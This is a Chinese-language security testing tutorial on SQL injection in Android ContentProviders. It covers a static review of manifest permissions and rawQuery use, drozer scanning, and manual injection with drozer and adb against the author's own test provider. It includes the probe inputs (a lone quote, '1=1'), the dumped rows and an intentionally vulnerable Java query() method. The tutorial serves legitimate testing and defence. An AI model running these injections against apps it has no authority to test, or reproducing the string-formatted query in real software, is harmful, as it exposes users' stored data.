# ContentProvider_SQLInject(一)
我们已经探究过 SQL 本地注入的问题，结论是可行(使用不当的时候风险存在)。

接下来我们从不同的测试角度来完成这个风险的认定。

## 一、完全静态代码检测
1. 查看 AndroidManifest.xml 文件中的所有 `<provider>` 节点。
2. 如果该节点 `android:enabled="true"` 检查 `<application>` 的 `android:enabled="true"`
    - 以下说法适用于上述两个节点
    - `android:enabled="true"`意味着 本组件可以被 Android 系统实例化，从而被三方应用调用。
    - 此属性默认值为 `android:enabled="true"` —— 即：对应节点如果没有设置改属性那么意味着 `android:enabled="true"`
3. 在 enable = true 的前提下查看权限属性    
    ```xml
    android:permission="string"         //无该属性即为不需要权限
    android:writePermission="string"    //无该属性即为不需要权限
    android:readPermission="string"     //无该属性即为不需要权限
    ```
    - 值的注意的是 ` readPermission 和 writePermission ` 属性比 `permission` 具有更高的优先级。如果 readPermission 也同时设置了，那么 readPermission 将控制 provider 的读取。如果 writePermission 也同时设置了，那么 writePermission 将控制 provider 的写入。  
    - 如果上述权限均设置均为null(“”)
        - 如果用声明了 `<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />` 节点那么造成任意文件读取风险(在4 5 均造成风险的前提下)。
        - 如果声明了 `<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />` 节点那么造成任意文件写入风险(在4 5 均造成风险的前提下)。
4. 根据 `<provider>` 节点的属性 `android:name` 所指定的路径找到 ContentProvider。
5. 锁定到 query() 方法。
    - 数据处理过程中使用了下述方法即为风险：
        1. 只使用下述方法基本可以确定风险存在了。
            - rawQuery(String sql, String[] selectionArgs)
            - rawQuery(String sql, String[] selectionArgs, CancellationSignal cancellationSignal)
            - rawQueryWithFactory(CursorFactory cursorFactory, String sql, String[] selectionArgs,String editTable)
            - rawQueryWithFactory(CursorFactory cursorFactory, String sql, String[] selectionArgs,String editTable, CancellationSignal cancellationSignal)            
        2. 在使用下述方法的情况下`selectionArgs`参数如果置空存在风险。
            - query(boolean distinct, String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy, String limit, CancellationSignal cancellationSignal)
            - query(boolean distinct, String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy, String limit)             
            - query(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy, String limit)
            - query(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy)

## 二、drozer 动态检测
run scanner.provider.injection -a packageName   
- 验证应用脆弱性
    ```terminal
    dz> run scanner.provider.injection -a com.example.tom.forbroadcast
    Scanning com.example.tom.forbroadcast...
    Not Vulnerable:
    content://com.example.tom.forbroadcast.com.android.tools.fd.runtime.InstantRunContentProvider
    content://com.example.tom.forbroadcast.com.android.tools.fd.runtime.InstantRunContentProvider/

    Injection in Projection:
    No vulnerabilities found.

    Injection in Selection:
    content://testin.cn/
    content://authorities
    content://testin.cn
    content://authorities/
    ```

Injection in Projection:    
Injection in Selection:     
- 上述两个语句之后如果为 `No vulnerabilities found.` 即无风险，否则有风险。

### 2.1、drozer 完成注入动作
```terminal
dz> run app.provider.query content://testin.cn/ --selection  "'"
unrecognized token: "';" (code 1): , while compiling: SELECT * FROM restaurants WHERE ';

dz> run app.provider.query content://testin.cn/ --selection 1=1
| _id | name | address | type | notes | phone |
| 1   | 1    | 1       | 1    | 1     | 1     |
| 2   | 2    | 2       | 2    | 2     | 2     |
| 3   | 3    | 3       | 3    | 3     | 3     |
| 4   | 4    | 4       | 4    | 4     | 4     |
```

## 三、adb 完成注入动作
```terminal
C:\Users\Tom>adb shell content query --uri content://testin.cn/ --where "'"
/system/bin/sh: no closing quote

C:\Users\Tom>adb shell content query --uri content://testin.cn/ --where "1=1"
Row: 0 _id=1, name=1, address=1, type=1, notes=1, phone=1
Row: 1 _id=2, name=2, address=2, type=2, notes=2, phone=2
Row: 2 _id=3, name=3, address=3, type=3, notes=3, phone=3
Row: 3 _id=4, name=4, address=4, type=4, notes=4, phone=4
```


## 附 上述注入所对应的代码
```java
@Nullable
@Override
public Cursor query(@NonNull Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {
    SQLiteDatabase sqLiteDatabase = this.mySQLiteOpenHelper .getReadableDatabase();
    String sqlSel = String.format("SELECT * FROM %s WHERE %s;", restaurants, selection);
    Log.i("select", sqlSel);
    Cursor cursor = sqLiteDatabase.rawQuery(sqlSel, null);
    return cursor;
}
```
